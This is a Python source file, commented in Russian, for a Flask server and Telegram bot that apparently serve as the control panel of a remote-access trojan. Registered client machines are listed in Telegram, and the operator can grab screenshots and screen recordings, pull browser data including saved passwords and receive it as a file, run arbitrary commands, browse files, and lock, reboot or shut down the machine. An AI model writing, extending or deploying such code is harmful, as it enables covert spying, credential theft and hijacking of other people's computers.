import os
import logging
import requests
import threading
import time
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)

app = Flask(__name__)

# Конфигурация
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
AUTHORIZED_USERS = [int(x) for x in os.getenv("AUTHORIZED_USERS", "").split(",")]
SERVER_URL = os.getenv("RENDER_EXTERNAL_URL", "https://your-app-name.onrender.com")
CLIENTS = {}
BROWSER_DATA_CACHE = {}
SYSTEM_INFO_CACHE = {}

# Настройка логгирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

@app.route('/register', methods=['POST'])
def register_client():
    data = request.json
    client_id = data['client_id']
    
    CLIENTS[client_id] = {
        'ip': data.get('ip', request.remote_addr),
        'port': data['port'],
        'url': f"http://{data['ip']}:{data['port']}",
        'last_seen': time.time(),
        'name': data.get('name', client_id),
        'user': data.get('user', 'Unknown')
    }
    
    # Отправляем уведомление в Telegram
    message = (
        f"🔔 *Новое устройство онлайн!*\n\n"
        f"💻 Имя: `{CLIENTS[client_id]['name']}`\n"
        f"👤 Пользователь: `{CLIENTS[client_id]['user']}`\n"
        f"🌐 IP: `{data['ip']}`\n"
        f"🆔 ID: `{client_id}`"
    )
    
    for user_id in AUTHORIZED_USERS:
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": user_id,
                    "text": message,
                    "parse_mode": "Markdown"
                }
            )
        except Exception as e:
            logging.error(f"Notification error: {e}")
    
    return jsonify({"status": "success"})

@app.route('/client/<client_id>/<command>', methods=['GET', 'POST'])
def client_command(client_id, command):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    
    client = CLIENTS[client_id]
    url = f"{client['url']}/{command}"
    
    try:
        if request.method == 'POST':
            response = requests.post(url, json=request.json, timeout=60)
        else:
            response = requests.get(url, timeout=60)
        
        # Кэшируем данные
        if command == "browser_data":
            BROWSER_DATA_CACHE[client_id] = response.json()
        elif command == "system_info":
            SYSTEM_INFO_CACHE[client_id] = response.json()
        
        return response.content, response.status_code, response.headers.items()
    except Exception as e:
        logging.error(f"Forward error: {e}")
        return jsonify({"error": str(e)}), 500

def cleanup_clients():
    """Очистка неактивных клиентов"""
    while True:
        time.sleep(300)
        now = time.time()
        inactive = [cid for cid, cdata in CLIENTS.items() if now - cdata['last_seen'] > 1800]
        
        for client_id in inactive:
            del CLIENTS[client_id]
            logging.info(f"Removed inactive client: {client_id}")

# Telegram Bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("⛔ Доступ запрещен!")
        return
    
    if not CLIENTS:
        await update.message.reply_text("🔎 Нет активных устройств")
        return
    
    keyboard = []
    for client_id, client_data in CLIENTS.items():
        btn_text = f"💻 {client_data['name']} ({client_data['user']})"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"select_{client_id}")])
    
    keyboard.append([InlineKeyboardButton("🔄 Обновить список", callback_data="refresh")])
    
    await update.message.reply_text(
        "🔒 Выберите устройство:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "refresh":
        await start(update, context)
        return
        
    if query.data.startswith("select_"):
        client_id = query.data.split("_")[1]
        context.user_data['selected_client'] = client_id
        client_data = CLIENTS[client_id]
        
        keyboard = [
            [InlineKeyboardButton("🖥 Скриншот", callback_data="screenshot"),
             InlineKeyboardButton("📹 Запись экрана (10 сек)", callback_data="record")],
            [InlineKeyboardButton("🔍 Системная информация", callback_data="system_info"),
             InlineKeyboardButton("🔑 Данные браузеров", callback_data="browser_data")],
            [InlineKeyboardButton("🔒 Блокировка", callback_data="lock"),
             InlineKeyboardButton("🖱 Клик мышью", callback_data="mouse_click")],
            [InlineKeyboardButton("❌ Alt+F4", callback_data="altf4"),
             InlineKeyboardButton("🔊 Громкость +", callback_data="volume_up")],
            [InlineKeyboardButton("🔁 Перезагрузка", callback_data="reboot"),
             InlineKeyboardButton("🔈 Громкость -", callback_data="volume_down")],
            [InlineKeyboardButton("⭕ Выключить", callback_data="shutdown"),
             InlineKeyboardButton("🔇 Выключить звук", callback_data="mute")],
            [InlineKeyboardButton("📂 Список файлов", callback_data="list_files"),
             InlineKeyboardButton("⌨️ Выполнить команду", callback_data="run_command")],
            [InlineKeyboardButton("💬 Отправить сообщение", callback_data="message_box"),
             InlineKeyboardButton("📥 Скачать файл", callback_data="download_file")],
            [InlineKeyboardButton("🔙 Назад", callback_data="back")]
        ]
        
        await query.edit_message_text(
            f"🔧 Управление устройством:\n"
            f"💻 *{client_data['name']}* ({client_data['user']})\n"
            f"🌐 IP: `{client_data['ip']}`\n"
            f"⏱ Последняя активность: {time.ctime(client_data['last_seen'])}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "back":
        await start(update, context)
        return
    
    if 'selected_client' not in context.user_data:
        await query.edit_message_text("❌ Устройство не выбрано!")
        return
    
    client_id = context.user_data['selected_client']
    command = query.data
    
    if command in ["run_command", "message_box", "list_files"]:
        context.user_data['last_command'] = command
        prompt = {
            "run_command": "⌨️ Введите команду для выполнения:",
            "message_box": "✉️ Введите сообщение для отображения:",
            "list_files": "📂 Введите путь к папке (например, C:\\):"
        }
        await query.edit_message_text(prompt[command])
        return
    
    try:
        response = requests.get(
            f"{SERVER_URL}/client/{client_id}/{command}",
            timeout=30
        )
        
        if response.status_code == 200:
            if command == "screenshot":
                await context.bot.send_photo(
                    chat_id=query.message.chat_id,
                    photo=response.content,
                    caption=f"🖥 Скриншот с {CLIENTS[client_id]['name']}"
                )
            elif command == "record":
                await context.bot.send_video(
                    chat_id=query.message.chat_id,
                    video=response.content,
                    caption=f"🎬 Видеозапись с {CLIENTS[client_id]['name']}",
                    supports_streaming=True
                )
            elif command == "browser_data":
                data = response.json()
                # Формируем краткий отчет
                report = "🔑 *Данные браузеров:*\n"
                for browser, browser_data in data.items():
                    if "passwords" in browser_data:
                        report += f"\n*{browser}*: {len(browser_data['passwords'])} паролей"
                
                # Отправляем полные данные файлом
                with open(f"browser_data_{client_id}.json", "w") as f:
                    json.dump(data, f)
                
                await query.edit_message_text(report)
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=open(f"browser_data_{client_id}.json", "rb")
                )
            elif command == "system_info":
                data = response.json()
                # Формируем краткий отчет
                report = (
                    f"💻 *Системная информация:*\n\n"
                    f"ОС: {data.get('system', '')} {data.get('release', '')}\n"
                    f"Процессор: {data.get('processor', '')}\n"
                    f"Память: {data.get('memory', {}).get('total', 0) // (1024**3)} GB\n"
                    f"Пользователи: {', '.join([u['name'] for u in data.get('users', [])])}"
                )
                
                # Отправляем полные данные файлом
                with open(f"system_info_{client_id}.json", "w") as f:
                    json.dump(data, f)
                
                await query.edit_message_text(report)
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=open(f"system_info_{client_id}.json", "rb")
                )
            else:
                await query.edit_message_text(f"✅ Команда выполнена на {CLIENTS[client_id]['name']}")
        else:
            await query.edit_message_text(f"❌ Ошибка выполнения команды")
    except Exception as e:
        logging.error(f"Command error: {e}")
        await query.edit_message_text("🔥 Ошибка соединения с устройством")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_USERS:
        return
    
    if 'last_command' not in context.user_data or 'selected_client' not in context.user_data:
        return
    
    text = update.message.text
    command = context.user_data['last_command']
    client_id = context.user_data['selected_client']
    
    try:
        if command == "run_command":
            response = requests.post(
                f"{SERVER_URL}/client/{client_id}/cmd",
                json={"command": text},
                timeout=30
            )
            if response.ok:
                result = response.json()
                output = result.get('output', '')[:4000]
                await update.message.reply_text(f"✅ Результат:\n```\n{output}\n```", parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Ошибка выполнения команды")
        
        elif command == "message_box":
            response = requests.post(
                f"{SERVER_URL}/client/{client_id}/message_box",
                json={"message": text},
                timeout=10
            )
            await update.message.reply_text("✅ Сообщение отправлено" if response.ok else "❌ Ошибка")
        
        elif command == "list_files":
            response = requests.post(
                f"{SERVER_URL}/client/{client_id}/list_files",
                json={"path": text},
                timeout=30
            )
            if response.ok:
                data = response.json()
                file_list = "\n".join([f"📁 {f['name']}" if f['type'] == 'directory' else f"📄 {f['name']}" 
                                      for f in data[:50]])
                await update.message.reply_text(f"📂 Содержимое {text}:\n{file_list}")
            else:
                await update.message.reply_text("❌ Ошибка получения списка файлов")
    
    except Exception as e:
        logging.error(f"Text command error: {e}")
        await update.message.reply_text("🔥 Ошибка соединения с устройством")
    
    # Сбрасываем состояние
    context.user_data.pop('last_command', None)

def run_bot():
    bot_app = Application.builder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CallbackQueryHandler(handle_selection))
    bot_app.add_handler(CallbackQueryHandler(handle_command))
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    bot_app.run_polling()

if __name__ == "__main__":
    # Запуск очистки неактивных клиентов
    threading.Thread(target=cleanup_clients, daemon=True).start()
    
    # Запуск бота в отдельном потоке
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Запуск Flask сервера
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
